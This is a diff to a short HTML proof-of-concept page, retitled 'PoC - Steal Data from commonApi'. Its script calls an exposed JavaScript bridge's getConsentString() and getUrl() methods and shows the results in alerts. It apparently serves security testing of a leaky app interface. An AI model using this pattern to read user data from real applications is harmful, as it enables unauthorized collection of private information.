@@ -1,17 +1,18 @@
+<!DOCTYPE html>
 <html>
   <body>
-    <h1>JS Interface Test</h1>
+    <h1>PoC - Steal Data from commonApi</h1>
     <script>
       try {
-        alert("URL: " + window.commonApi.getUrl());
-      } catch(e) {
-        alert("Error: " + e);
+        alert("Consent: " + window.commonApi.getConsentString());
+      } catch (e) {
+        alert("Error (consent): " + e);
       }
 
       try {
-        alert("Consent: " + window.commonApi.getConsentString());
-      } catch(e) {
-        alert("Error: " + e);
+        alert("URL: " + window.commonApi.getUrl());
+      } catch (e) {
+        alert("Error (url): " + e);
       }
     </script>
   </body>
